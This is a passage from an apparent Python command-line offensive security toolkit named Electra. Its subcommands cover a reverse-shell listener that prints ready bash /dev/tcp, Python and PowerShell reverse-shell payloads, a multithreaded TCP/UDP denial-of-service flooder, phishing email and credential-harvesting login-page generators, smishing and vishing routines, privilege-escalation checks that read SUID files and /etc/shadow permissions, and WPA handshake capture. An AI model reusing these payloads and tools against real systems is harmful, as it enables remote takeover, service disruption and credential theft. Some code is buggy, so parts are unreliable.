                        response = requests.get(param_url, params=param_data, timeout=timeout)
                    if response.status_code in valid_status_codes:
                        click.echo(click.style(f"[!] Parameter found: {param}={value} (Status: {response.status_code})", fg="green"))
                except requests.RequestException:
                    click.echo(click.style(f"[!] Error trying with parameter: {param}={value}", fg="red"))
    
    click.echo(click.style(f"[*] Starting fuzzing on {url} with {concurrency} concurrent threads...", fg="blue"))
    with concurrent.futures.ThreadPoolExecutor(max_workers=concurrency) as executor:
        executor.map(fuzz_path, words)
        if params and values:
            executor.submit(fuzz_params)
    click.echo(click.style("[*] Fuzzing completed.", fg="blue"))

#REVSH COMMAND
@cli.command()
@click.option("-h", "--host", required=True, help="IP address to listen on for incoming connections.")
@click.option("-p", "--port", required=True, type=int, help="Port number to listen on.")
@click.option("-t", "--type", type=click.Choice(["bash", "python", "powershell"]), required=True, help="Type of reverse shell.")
@click.option("-a", "--arch", type=click.Choice(["x86", "x64"]), default="x64", help="Architecture of the payload. Default = x64")
def revsh(host, port, type, arch):
    click.echo(click.style(f"[*] Setting a {type} reverse shell listener on {host}:{port} for {arch}...", fg="blue"))
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(1)
    click.echo(click.style(f"[!] Listening on {host}:{port} ...", fg="green"))
    try:
        conn, addr = server_socket.accept()
        click.echo(click.style(f"[+] Connection received from {addr}", fg="green"))
        if type == "bash":
            click.echo(click.style(f"[!] Payload to execute on target:\nbash -i >& /dev/tcp/{host}/{port} 0>&1", fg="yellow"))
        elif type == "python":
            click.echo(click.style(f"[!] Payload to execute on target:\npython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{host}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'", fg="yellow"))
        elif type == "powershell":
            if arch == "x64":
                click.echo(click.style(f"[!] Payload to execute on target:\n$client = New-Object System.Net.Sockets.TCPClient(\"{host}\", {port});$stream = $client.GetStream();[byte[]]$buffer = 0..65535|%{{0}};while(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()", fg="yellow"))
            else:
                click.echo(click.style(f"[!] Payload to execute on target:\n", fg="yellow"))
        
        while True:
            command = input(f"{addr}> ")
            if command.lower() in ("exit", "quit"):
                conn.send(b"exit\n")
                click.echo(click.style(f"[!] Connection terminated.", fg="magenta"))
                break
            conn.send(command.encode() + b"\n")
            response = conn.recv(4096)
            click.echo(click.style(response.decode()))
    except Exception as e:
        click.echo(click.style(f"[!] Error: {e}", fg="red"))
    finally:
        conn.close()
        server_socket.close()
        click.echo(click.style(f"[!] Listener terminated.", fg="magenta"))

#NETSTR COMMAND
@cli.command()
@click.option("-h", "--host", required=True, help="Target IP or hostname.")
@click.option("-p", "--port", default=443, type=int, help="Target port. Default = 443")
@click.option("-c", "--count", default=1000, type=int, help="Number of requests/packets to send. Default = 1000")
@click.option("-t", "--threads", default=10, type=int, help="Number of concurrent threads. Default = 10")
@click.option("-d", "--delay", default=0.0, type=float, help="Delay between requests/packets in seconds. Default = 0.0")
@click.option("-u", "--udp", is_flag=True, help="Perform a UDP attack instead of TCP.")
@click.option("-f", "--file", type=click.Path(exists=True), help="Path to payload file.")
def netstr(host, port, count, threads, delay, udp, file):
    if file:
        with open(file, "rb") as f:
            payload = f.read()
        click.echo(click.style(f"[!] Successfully loaded payload from {file}.", fg="green"))
    else:
        payload = b"A * 1024" #Default dummy payload
        click.echo(click.style(f"[!] Using default payload", fg="green"))

    click.echo(click.style(f"[*] Performing {'UDP' if udp else 'TCP'} DoS/DDoS attack on {host}:{port} ...", fg="blue"))
    def send():
        for _ in range(count // threads):
            try:
                if udp:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.sendto(payload, (host, port))
                else:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.connect((host, port))
                    #sock.send(b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\n\r\n")
                    sock.send(payload)
                sock.close()
                time.sleep(delay)
            except Exception as e:
                click.echo(click.style(f"[!] Error: {e}", fg="red"))
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [executor.submit(send) for _ in range(threads)]
        for future in concurrent.futures.as_completed(futures):
            if future.exception():
                click.echo(click.style(f"[!] Thread error: {future.exception()}", fg="red"))
    
    click.echo(click.style(f"DoS/DDoS attack completed.", fg="green"))

#ENCHECK COMMAND
@cli.command()
@click.option("-s", "--service", type=click.Choice(["http", "ftp", "imap", "pop3", "smtp"], case_sensitive=False), help="Service to analyze.")
@click.option("-h", "--host", required=True, help="IP or host of the target service.")
@click.option("-p", "--port", type=int, help="Port of the target service.")
def encheck(service, host, port):
    click.echo(click.style(f"[*] Starting encryption analysis for {service.upper()} on {host}:{port} ...", fg="blue"))
    try:
        if service.lower() == "http":
            port = port or 80
            try:
                response = requests.get(f"http://{host}:{port}", timeout=5)
                click.echo(click.style(f"[!] HTTP service detected on {host}:{port}. Insecure protocol.", fg="green"))
            except requests.exceptions.SSLError:
                click.echo(click.style(f"[!] HTTPS service detected on {host}:{port}. Secure protocol.", fg="yellow"))
        elif service.lower() == "ftp":
            port = port or 21
            with ftplib.FTP() as ftp:
                ftp.connect(host, port, timeout=5)
                click.echo(click.style(f"[!] FTP service detected on {host}:{port}. Insecure protocol.", fg="green"))
        elif service.lower() in ["imap", "pop3", "smtp"]:
            port = port or {"imap": 143, "pop3": 110, "smtp": 25}[service.lower()]
            secure_ports = {"imap": 993, "pop3": 995, "smtp": 465}[service.lower()]
            try:
                context = ssl.create_default_context()
                with socket.create_connection((host, port), timeout=5) as sock:
                    with context.wrap_socket(sock, server_hostname=host) as secure_sock:
                        click.echo(click.style(f"[!] {service.upper()} on {host}:{port} supports TLS/SSL. Secure protocol.", fg="yellow"))
            except ssl.SSLError:
                click.echo(click.style(f"[!] {service.upper()} on {host}:{port} does not support TLS/SSL. Insecure protocol.", fg="green"))
            except Exception as e:
                click.echo(click.style(f"[!] Error analyzing {service.upper()} on {host}:{port}. {e}", fg="red"))
        else:
            click.echo(click.style(f"[!] Unsupported service: {service}", fg="red"))
    except Exception as e:
        click.echo(click.style(f"[!] Error: {e}", fg="red"))

#EXPLOIT COMMAND
@cli.command()
@click.option("-q", "--query", required=True, help="Search query (Name, CVE or Version).")
@click.option("-o", "--output", type=click.Path(), help="Path to save the results.")
def exploit(query, output):
    click.echo(click.style(f"[*] Searching for exploits related to: {query} ...", fg="blue"))
    try:
        url = f"https://www.exploit-db.com/search?q={query}"
        headers = {
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1 Edg/130.0.0.0"
        }
        response = requests.get(url, headers=headers) #headers = headers
        if response.status_code != 200:
            click.echo(click.style(f"[!] Failed to fetch exploit data.", fg="red"))
            return
        
        bs = BeautifulSoup(response.text, "html.parser")
        results = []
        for row in bs.select("exploits-table_info"): #table.table-results tbody tr
            cols = row.find_all("td")
            if len(cols) > 2 and cols[1].find("a"):
                exploit_title = cols[1].text.strip()
                exploit_date = cols[2].text.strip()
                exploit_link = "https://www.exploit-db.com" + cols[1].find("a")["href"]
                results.append((exploit_title, exploit_date, exploit_link))
            #else:
            #    continue
        
        if not results:
            click.echo(click.style(f"[!] No exploits found for the provided query.", fg="magenta"))
            return
        click.echo(click.style(f"[!] Found exploits:", fg="green"))
        for id, (title, date, link) in enumerate(results, 1):
            click.echo(click.style(f"[{id}] {title} ({date}) - {link}", fg="yellow"))
        
        if output:
            with open("Electra-Exploit-Search.txt", "a") as file:
                for title, date, link in results:
                    file.write(f"{title} ({date}) - {link}\n")
            click.echo(click.style(f"[!] Successfully saved results to {output}", fg="green"))
    
    except requests.RequestException as e:
        click.echo(click.style(f"[!] Error connecting to ExploitDB: {e}", fg="red"))
    except Exception as e:
        click.echo(click.style(f"[!] Error: {e}", fg="red"))

#PASSPERM COMMAND
@cli.command()
@click.option("-w", "--wordlist", type=click.Path(exists=True), required=True, help="Path to password wordlist.")
@click.option("-o", "--output", default="Electra-Perm-Passwords.txt", help="Output file to save permutated passwords.")
@click.option("-m", "--mode", type=click.Choice(["numbers", "special", "both", "chars", "all"], case_sensitive=False), required=True, help="Permutation mode. both = numbers & special characters. all = numbers, special characters & characters.")
@click.option("-l", "--length", default=1, help="Length of permutations. (Default = 1)")
def passperm(wordlist, output, mode, length):
    click.echo(click.style("[*] Starting password permutation ...", fg="blue"))
    numbers = "0123456789"
    special_chars = "!@#$%^&*()-_=+[]{};:',.<>?/|\\"
    chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    charset = ""

    if mode == "numbers":
        charset = numbers
    elif mode == "special":
        charset = special_chars
    elif mode == "both":
        charset = numbers + special_chars
    elif mode == "chars":
        charset = chars
    elif mode == "all":
        charset = numbers + special_chars + chars
    
    try:
        with open(wordlist, "r") as infile, open(output, "a") as outfile:
            passwords = [line.strip() for line in infile]
            click.echo(click.style(f"[~] Loaded {len(passwords)} passwords from the wordlist.", fg="yellow"))
            #Generate permutations
            for password in passwords:
                new_passwords = set()
                for combination in itertools.product(charset, repeat=length):
                    comb = "".join(combination)
                    
                    #Create combinations
                    new_passwords.add(password + comb)
                    new_passwords.add(comb + password)

                    #Replace characters within the password
                    for i in range(len(password)):
                        replace = (password[:i] + comb[0] + password[i + 1:])
                        #Replace one character
                        new_passwords.add(replace)
                
                for new_password in new_passwords:
                    outfile.write(new_password + "\n")
        click.echo(click.style(f"[!] Password permutations successfully saved to {output}", fg="green"))
    except Exception as e:
        click.echo(click.style(f"[!] Error: {e}", fg="red"))

#NANAL COMMAND
@cli.command()
@click.option("-p", "--period", type=int, help="Duration in seconds to capture packets.")
@click.option("-f", "--file", type=click.Path(exists=True), help="Path to an existing pcap file for analysis.")
def nanal(period, file):
    if not period and not file:
        click.echo(click.style("[!] Specify a period for capture (-p) or provide an existing file (-f).", fg="magenta"))
        return
    
    if period:
        click.echo(click.style(f"[*] Starting packet capture for {period} seconds ...", fg="blue"))
        try:
            packets = sniff(timeout=period)
            output_file = f"Electra-Capture-{int(time.time())}.pcap"
            wrpcap(output_file, packets)
            click.echo(click.style(f"[!] Capture completed. File saved to {output_file}", fg="green"))
            pkt_anal(output_file)
        except Exception as e:
            click.echo(click.style(f"[!] Error during packet capture: {e}", fg="red"))
    
    if file:
        click.echo(click.style(f"[*] Analyzing packets in file: {file} ...", fg="blue"))
        pkt_anal(file)

def pkt_anal(file):
    try:
        capture = pyshark.FileCapture(file)
        unusual_packets = []
        click.echo(click.style(f"[*] Scanning packets in {file} for anomalies ...", fg="blue"))
        for packet in capture:
            try:
                if "ICMP" in packet and hasattr(packet.icmp, "type") and packet.icmp.type == "8":
                    unusual_packets.append(f"ICMP Echo Request from {packet.ip.src} to {packet.ip.dst}")
                if "TCP" in packet and hasattr(packet.tcp, "flags") and int(packet.tcp.flags, 16) == 0x3F:
                    unusual_packets.append(f"SYN-FIN-PSH-URG flags set in TCP packet from {packet.ip.src} to {packet.ip.dst}")
                if "DNS" in packet and packet.dns.qry_name.endswith("."):
                    unusual_packets.append(f"DNS query for suspicious domain: {packet.dns.qry_name}")
            except AttributeError:
                continue
        
        if unusual_packets:
            click.echo(click.style(f"[!] Detected unusual activity:", fg="yellow"))
            for pkt in unusual_packets:
                click.echo(click.style(f"{pkt}", fg="yellow"))
        else:
            click.echo(click.style(f"[!] No unusual activity detected.", fg="green"))
        capture.close()
    
    except Exception as e:
        click.echo(click.style(f"[!] Error analyzing pcap file. {e}", fg="red"))

#CODEC COMMAND
@cli.command()
@click.option("-e", "--encode", is_flag=True, help="Encode the input.")
@click.option("-d", "--decode", is_flag=True, help="Decode the input.")
@click.option("-f", "--format", required=True, type=click.Choice(["base64", "url", "binary", "decimal", "octal", "hex"], case_sensitive=False), help="Specify the format (base64, url, etc).")
@click.option("-i", "--input", required=True, help="Input string to encode or decode.")
def codec(encode, decode, format, input):
    if encode and decode:
        click.echo(click.style("[!] Error: Please choose either encode or decode, not both.", fg="red"))
        return
    
    if not encode and not decode:
        click.echo(click.style("[!] Error: Please specify an option. Encode (-e) Decode (-d).", fg="red"))
        return
    
    try:
        if encode:
            if format == "base64":
                output = base64.b64encode(input.encode()).decode()
            elif format == "url":
                output = urllib.parse.quote(input)
            elif format == "binary":
                output = " ".join(format(ord(c), "08b") for c in input)
            elif format == "decimal":
                output = " ".join(str(ord(c)) for c in input)
            elif format == "octal":
                output = " ".join(format(ord(c), "o") for c in input)
            elif format == "hex":
                output = input.encode().hex()
            else:
                click.echo(click.style("[!] Invalid format specified.", fg="red"))
                return
            click.echo(click.style(f"[!] Encoded output: {output}", fg="green"))

        if decode:
            if format == "base64":
                output = base64.b64decode(input).decode()
            elif format == "url":
                output = urllib.parse.unquote(input)
            elif format == "binary":
                output = "".join(chr(int(b, 2)) for b in input.split())
            elif format == "decimal":
                output = "".join(chr(int(d)) for d in input.split())
            elif format == "octal":
                output = "".join(chr(int(o, 8)) for o in input.split())
            elif format == "hex":
                output = bytes.fromhex(input).decode()
            else:
                click.echo(click.style("[!] Invalid format specified.", fg="red"))
                return
            click.echo(click.style(f"[!] Decoded output: {output}", fg="green"))
    
    except Exception as e:
        click.echo(click.style(f"[!] Error: {e}", fg="red"))

#PHISH COMMAND
@cli.command()
@click.option("-m", "--mode", required=True, type=click.Choice(["email", "login"], case_sensitive=False), help="Modes: email = Generate email phishing templates | login = Generate phishing login pages.")
@click.option("-t", "--template", type=click.Path(exists=True), help="Path to custom phishing template file.")
@click.option("-o", "--output", default=os.path.join(os.getcwd(), "Phishing"), help="Output directory for generated content.")
@click.option("-T", "--track", is_flag=True, help="Enable tracking of clicks and credential submissions. Default Flask Server: http://127.0.0.1:5000/track") #is_flag=True
@click.option("-u", "--url", help="URL for tracking in emails or login pages. Flask Server Defaults = localhost, port: 5000, page: track") #default="http://127.0.0.1:5000/track"
def phish(mode, template, output, track, url):
    click.echo(click.style(f"[*] Started phishing using {mode} mode.", fg="blue"))
    if not os.path.exists(output):
        os.makedirs(output)
    if mode == "email":
        generate_email(template, output, track, url)
    elif mode == "login":
        generate_login(template, output, track, url)
    else:
        click.echo(click.style(f"[!] Error. Invalid mode.", fg="red"))

def generate_email(template, output, track , url):
    default_template = """\
Subject: Important Account Security Notification
<br><br>
Dear User,
<br><br>
We have detected unusual activity in your account. Please verify your credentials by clicking the link below:
<br><br>
<a href="{tracking_url}">Verify Account</a>
<br><br>
Thank you,
<br>
Electra Security Team
"""
    try:
        if template:
            with open(template, "r") as file:
                email_content = file.read()
        else:
            email_content = default_template
        
        tracking_url = url if url else "http://127.0.0.1:5000/track" #Custom tracking url
        email_content = email_content.format(tracking_url=tracking_url)
        output_file = os.path.join(output, "Phishing-Email-Template.html")
        with open(output_file, "w") as file:
            file.write(email_content)
        click.echo(click.style(f"[!] Phishing email template successfully saved to {output_file}", fg="green"))
    
    except Exception as e:
        click.echo(click.style(f"[!] Error: {e}", fg="red"))

def generate_login(template, output, track, url):
    default_template = """\
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Page</title>
</head>
<body>
    <h2>Login to your account</h2>
    <form method="POST" action="{tracking_url}">
        <label for="username">Username:</label>
        <input type="text" id="username" name="username"><br>
        <label for="password">Password:</label>
        <input type="password" id="password" name="password"><br>
        <button type="submit">Login</button>
    </form>
</body>
</html>
"""
    try:
        if template:
            with open(template, "r") as file:
                page_content = file.read()
        else:
            page_content = default_template
        
        tracking_url = url if url else "http://127.0.0.1:5000/track" #Custom tracking url
        page_content = page_content.format(tracking_url=tracking_url)
        output_file = os.path.join(output, "Phishing-Login-Page.html")
        with open(output_file, "w") as file:
            file.write(page_content)
        click.echo(click.style(f"[!] Phishing login page template successfully saved to {output_file}", fg="green"))
    
    except Exception as e:
        click.echo(click.style(f"[!] Error: {e}", fg="red"))

#DWRECON COMMAND
@cli.command()
@click.option("-u", "--url", help=".onion URL to scrape.")
@click.option("-l", "--list", type=click.Path(exists=True), help="Path to file containing .onion URLs to scrape.")
@click.option("-k", "--keywords", help="Comma-seperated list of keywords to search for in the website content.")
@click.option("-o", "--output", default=os.path.join(os.getcwd(), "DarkWeb/Electra-DarkWeb-Recon.txt"), help="Output file to save results. Default = Electra-DarkWeb-Recon.txt")
def dwrecon(url, list, keywords, output):
    click.echo(click.style("[*] Starting Dark Web Reconnaissance ...", fg="blue"))
    proxies = {
        "http": "socks5h://127.0.0.1:9050",
        "https": "socks5h://127.0.0.1:9050"
    }
    urls = []
    if url:
        urls.append(url)
    if list:
        try:
            with open(list, "r") as file:
                urls.extend([line.strip() for line in file if line.strip()])
        except FileNotFoundError:
            click.echo(click.style(f"[!] Error: List file '{list}' not found.", fg="red"))
            return
    if not urls:
        click.echo(click.style(f"[!] Error: No URLs provided. Use -u or -l option.", fg="red"))
        return
    keywords = [kw.strip().lower() for kw in keywords.split(",")] if keywords else []
    #Scraping
    results = []
    for target_url in urls:
        click.echo(click.style(f"[~] Connecting to {target_url} ...", fg="yellow"))
        try:
            response = requests.get(target_url, proxies=proxies, timeout=30)
            if response.status_code == 200:
                soup = BeautifulSoup(response.text, "html.parser")
                page_text = soup.get_text().lower()
                matches = []
                for keyword in keywords:
                    if keyword in page_text:
                        matches.append(keyword)
                results.append({
                    "url": target_url,
                    "status": "success",
                    "found_keywords": matches,
                    "content": response.text if not keywords else None
                })
                click.echo(click.style(f"[!] Found keywords: {', '.join(matches) if matches else 'None'}", fg="green"))
            else:
                results.append({
                    "url": target_url,
                    "status": f"Error: HTTP {response.status_code}",
                    "found_keywords": [],
                    "content": None
                })
                click.echo(click.style(f"[!] Failed to scrape {target_url}. HTTP {response.status_code}", fg="red"))
        except Exception as e:
            results.append({
                "url": target_url,
                "status": f"Error {str(e)}",
                "found_kewords": [],
                "content": None
            })
            click.echo(click.style(f"[!] Error connecting to {target_url}. {e}", fg="red"))
    
    with open(output, "w") as file:
        for result in results:
            file.write(f"URL: {result['url']}\n")
            file.write(f"Status: {result['status']}\n")
            if result["found_keywords"]:
                file.write(f"Found keywords: {', '.join(result['found_keywords'])}\n")
            if result['content']:
                file.write("Content:\n")
                file.write(result['content'])
            file.write("\n" + "-" * 40 + "\n")
    
    click.echo(click.style(f"[!] Dark Web Reconnaissance completed. Results successfully saved to {output}", fg="green"))

#SOCENG COMMAND
@cli.command()
@click.option("-t", "--type", type=click.Choice(["smishing", "vishing"], case_sensitive=False), required=True, help="Type of Social Engineering attack (Smishing & Vishing).")
@click.option("-n", "--number", type=click.Path(exists=True), required=True, help="Path to the file containing target phone numbers.")
@click.option("-m", "--message", help="Message content for smishing (Required for SMS attacks).")
@click.option("-a", "--audio", help="Path to pre-recorded audio file for vishing.")
@click.option("-o", "--output", default=os.path.join(os.getcwd(), "SocEng/Electra-SocEng-Results.txt"), help="File to save the results. Default = Electra-SocEng-Results.txt")
def soceng(type, numbers, message, audio, output):
    click.echo(click.style(f"[*] Starting {type} attack ...", fg="blue"))
    try:
        with open(numbers, "r") as file:
            targets = [line.strip() for line in file if line.strip()]
        if not targets:
            click.echo(click.style("[!] No valid phone numbers found in the file.", fg="red"))
            return
        if type == "smishing":
            if not message:
                click.echo(click.style("[!] Error: Message content is required for smishing", fg="red"))
                return
            click.echo(click.style("[*] Sending SMS to targets ...", fg="blue"))
            for target in targets:
                try:
                    click.echo(click.style(f"[~] Sending SMS: {message} to {target}", fg="yellow"))
                    #Twilio API call
                    #Client.messages.create(to=target, from_="", body=message)
                except Exception as e:
                    click.echo(click.style(f"[!] Failed to send SMS to {target}. Error: {e}", fg="red"))
        
        elif type == "vishing":
            click.echo(click.style("[!] Initiating voice calls to targets ...", fg="blue"))
            for target in targets:
                try:
                    if audio:
                        click.echo(click.style(f"[~] Calling {target} with pre-recorded audio: {audio}", fg="yellow"))
                        #SIP/VoIP API call
                        #pysip.Client.__call__(target, audio_file=audio)
                    else:
                        click.echo(click.style(f"[~] Live call initiated to {target}.", fg="yellow"))
                        #SIP/VoIP API live call
                        #pysip.Client.__call__(target)
                except Exception as e:
                    click.echo(click.style(f"[!] Failed to call {target}. Error: {e}", fg="red"))
        
        with open(output, "a") as log_file:
            log_file.write(f"{type.capitalize()} attack results:\n")
            log_file.write("\n".join(targets) + "\n")
        click.echo(click.style(f"[!] {type.capitalize()} attack completed. Results Successfully saved to {output}.", fg="green"))
    
    except FileNotFoundError:
        click.echo(click.style(f"[!] Error: Target numbers file not found.", fg="red"))
    except Exception as e:
        click.echo(click.style(f"[!] Error: {e}", fg="red"))

#CLOUDSEC COMMAND
@cli.command()
@click.option("-p", "--provider", type=click.Choice(["aws", "azure", "gcp"], case_sensitive=False), help="Cloud provider. aws = Amazon AWS | azure = Microsoft Azure | gcp = Google Cloud")
@click.option("-a", "--action", type=click.Choice(["s3", "misconfig", "iamp"], case_sensitive=False), help="Action to perform. s3 = S3 Bucket Enumeration | misconfig = Check for misconfigurations | iamp = Assess IAM Policies")
@click.option("-k", "--key", default=None, help="Cloud API key or credentials file for authentication.")
@click.option("-s", "--subscription-key", default=None, help="Azure subscription key for authentication.")
def cloudsec(provider, action, key, subscription_key):
    click.echo(click.style(f"[*] Initiating cloud security test for {provider.upper()} ...", fg="blue"))
    try:
        if provider == "aws" and action == "s3":
            s3_enum(key)
        elif provider == "aws" and action == "iamp":
            assess_iamp(key)
        elif provider == "azure" and action == "misconfig":
            azure_misconfig(key)
        elif provider == "gcp" and action == "misconfig":
            gcp_misconfig(key)
        else:
            click.echo(click.style("[!] Invalid provider-action combination.", fg="red"))
    except Exception as e:
        click.echo(click.style(f"[!] Error: {e}", fg="red"))

def s3_enum(key):
    click.echo(click.style("[*] Enumerating S3 buckets ...", fg="blue"))
    if key:
        session = boto3.Session(profile_name=key)
    else:
        session = boto3.Session()
    
    s3 = session.client("s3")
    try:
        response = s3.list_buckets()
        click.echo(click.style("[!] Found buckets:", fg="green"))
        for bucket in response.get("Buckets", []):
            click.echo(click.style(f" - {bucket['Name']}", fg="green"))
    except Exception as e:
        click.echo(click.style(f"[!] Error accessing S3: {e}", fg="red"))

def assess_iamp(key):
    click.echo(click.style("[*] Assessing IAM policies ...", fg="blue"))
    if key:
        session = boto3.Session(profile_name=key)
    else:
        session = boto3.Session()
    
    iamp = session.client("iam")
    try:
        response = iamp.list_roles()
        click.echo(click.style("[!] Found IAM roles:", fg="green"))
        for role in response.get("Roles", []):
            click.echo(click.style(f" - {role['RoleName']}", fg="green"))
    except Exception as e:
        click.echo(click.style(f"[!] Error accessing IAM roles. {e}", fg="red"))

def azure_misconfig(key, subscription_key):
    click.echo(click.style("[*] Checking Azure for misconfigurations ...", fg="blue"))
    try:
        credential = DefaultAzureCredential() if not key else key
        if not subscription_key:
            raise ValueError("Azure subscription key is required.")
        client = ResourceManagementClient(credential, subscription_key)
        for group in client.resource_groups.list():
            click.echo(click.style(f"Resource group: {group.name}", fg="green"))
    except Exception as e:
        click.echo(click.style(f"[!] Error accessing Azure resources. {e}", fg="red"))

def gcp_misconfig(key):
    click.echo(click.style("[*] Checking GCP for misconfigurations ...", fg="blue"))
    try:
        client = storage.Client.from_service_account_json(key) if key else storage.Client()
        buckets = client.list_buckets()
        click.echo(click.style("[!] Found buckets:", fg="green"))
        for bucket in buckets:
            click.echo(click.style(f" - {bucket.name}", fg="green"))
    except Exception as e:
        click.echo(click.style(f"[!] Error accessing GCP resources. {e}", fg="red"))

#PRIVESCDET COMMAND
@cli.command()
@click.option("-m", "--mode", default="basic", type=click.Choice(["basic", "advanced"], case_sensitive=False), help="Detection mode (basic | advanced).")
@click.option("-t", "--target", default="127.0.0.1", help="Target system. Default = localhost")
@click.option("-o", "--output", default="Electra-PrivEsc-Results.txt", help="Output file to save results.")
@click.option("-u", "--username", help="Username for remote login.")
@click.option("-p", "--password", help="Password for remote login.")
@click.option("-s", "--system", type=click.Choice(["unix", "windows"], case_sensitive=False), help="Target operating system.")
def privescdet(mode, target, output, username, password, system):
    results = []

    if target != "127.0.0.1" and system:
        click.echo(click.style(f"Scanning remote target: {target}.", fg="blue"))
        if system == "unix":
            results.append("== Sudo Permissions ==")
            results.append(remote_unix(target, username, password, "sudo -l"))

            results.append("\n== SUID Files ==")
            results.append(remote_unix(target, username, password, "find / -perm -4000 2>/dev/null"))

            results.append("\n== Writable System Files ==")
            for file in ["/etc/passwd", "/etc/shadow"]:
                results.append(remote_unix(target, username, password, f"ls -l {file}"))
            
            results.append("\n== World-Writable Files ==")
            results.append(remote_unix(target, username, password, "find / -perm -2 ! -type l 2>/dev/null"))
        
        elif os == "windows":
            results.append("== User Privileges ==")
            results.append(remote_windows(target, username, password, "whoami /priv"))

            results.append("\n== Writable System Files ==")
            results.append(remote_windows(target, username, password, "icacls 'c:\\Windows\\System32'"))

            results.append("\n== Scheduled Tasks ==")
            results.append(remote_windows(target, username, password, "schtasks /query /fo LIST"))
    
    else:
        click.echo(click.style("Scanning localhost.", fg="blue"))

    click.echo(click.style(f"[*] Running Privilege Escalation detection in {mode} mode ...", fg="blue"))

    if mode == "basic":
        #Check Sudo permissions
        results.append("== Sudo Permissions ==")
        try:
            sudo_check = subprocess.check_output("sudo -l", shell=True, text=True, stderr=subprocess.DEVNULL)
            results.append(sudo_check.strip())
        except subprocess.CalledProcessError:
            click.echo(click.style("[!] Failed to check Sudo permissions.", fg="red"))
        
        #Find SUID files
        results.append("\n== SUID Files ==")
        try:
            suid_files = subprocess.check_output("find / -perm -4000 2>/dev/null", shell=True, text=True)
            results.append(suid_files.strip() if suid_files else "No SUID files found.")
        except subprocess.CalledProcessError:
            click.echo(click.style("[!] Failed to find SUID files.", fg="red"))
        
        #Check writable passwd and shadow file
        results.append("\n== Writable System Files ==")
        for file in ["/etc/passwd", "/etc/shadow"]:
            if os.access(file, os.W_OK):
                results.append(f"{file} is writable. Potential Privilege Escalation.")
            else:
                results.append(f"{file} is not writable.")
        
        #Check for world-writable files/directories
        results.append("\n== World-Writable Files ==")
        try:
            writable_files = subprocess.check_output("find / -perm -2 ! -type l 2>/dev/null", shell=True, text=True)
            results.append(writable_files.strip() if writable_files else "No world-writable files found.")
        except subprocess.CalledProcessError:
            click.echo(click.style("[!] Failed to find world-writable files.", fg="red"))
    
    elif mode == "advanced":
        click.echo(click.style(f"[*] Running Privilege Escalation detection in {mode} mode ...", fg="blue"))
        #Kernel exploits
        results.append("\n== Kernel Exploits ==")
        try:
            kernel_version = subprocess.check_output("uname -r", shell=True, text=True).strip()
            results.append(f"Kernel Version: {kernel_version}")
            #Compare against known vulnerabilities (add logic to query or check a database)
        except subprocess.CalledProcessError:
            click.echo(click.style("[!] Failed to retrieve kernel version.", fg="red"))
        
        #Misconfigured services
        results.append("\n== Misconfigured Services ==")
        try:
            services = subprocess.check_output("ps aux | grep root", shell=True, text=True).strip()
            results.append(services)
        except subprocess.CalledProcessError:
            click.echo(click.style("[!] Failed to retrieve running services.", fg="red"))
        
        #Weak file permissions
        results.append("\n== Weak File Permissions ==")
        try:
            weak_files = subprocess.check_output("find / -name '*.key' -o -name '*.conf' 2>/dev/null", shell=True, text=True).strip()
            results.append(weak_files if weak_files else "No files with weak permissions found.")
        except subprocess.CalledProcessError:
            click.echo(click.style("[!] Failed to find files with weak permissions.", fg="red"))
    
    result_text = "\n".join(results)
    if output:
        with open(output, "w") as file:
            file.write(result_text)
        click.echo(click.style(f"[!] Results successfully saved to {output}.", fg="green"))
    else:
        click.echo(result_text)

def remote_unix(host, username, password, command):
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(hostname=host, username=username, password=password)
        stdin, stdout, stderr = client.exec_command(command)
        output = stdout.read().decode().strip()
        client.close()
        return output
    except Exception as e:
        click.echo(click.style(f"Error connecting to Unix system: {e}", fg="red"))

def remote_windows(host, username, password, command):
    try:
        session = Session(f"http://{host}:5985/wsman", auth=(username, password))
        result = session.run_cmd(command)
        return result.std_out.decode().strip()
    except Exception as e:
        click.echo(click.style(f"[!] Error connecting to Windows system: {e}", fg="red"))

#WIFIATK COMMAND
@cli.command()
@click.option("-m", "--monitor", is_flag=True, help="Enable Wi-Fi monitoring mode.")
@click.option("-c", "--capture", is_flag=True, help="Capture WPA/WPA2 handshake packets.")
@click.option("-C", "--crack", type=click.Path(exists=True), help="Crack WPA/WPA2 passwords using a wordlist.")
@click.option("-r", "--rogue", is_flag="True", help="Detect rogue access points.")
@click.option("-s", "--signal", is_flag=True, help="Analyze Wi-Fi signal strength.")
@click.option("-i", "--interface", required=True, help="Wireless interface to use.")
@click.option("-o", "--output", default="Electra-Handshake.pcap", help="Output file for handshake capture.")
def wifiatk(monitor, capture, crack, rogue, signal, interface, output):
    click.echo(click.style(f"[*] Initializing Wi-Fi security testing on interface: {interface} ...", fg="blue"))
    if monitor:
        click.echo(click.style(f"[*] Enabling monitor mode ...", fg="blue"))
        try:
            subprocess.run(["airmon-ng", "start", interface], check=True) #REQUIREMENT = airmon-ng
            click.echo(click.style(f"[+] Monitor mode enabled on {interface}.", fg="green"))
        except subprocess.CalledProcessError as e:
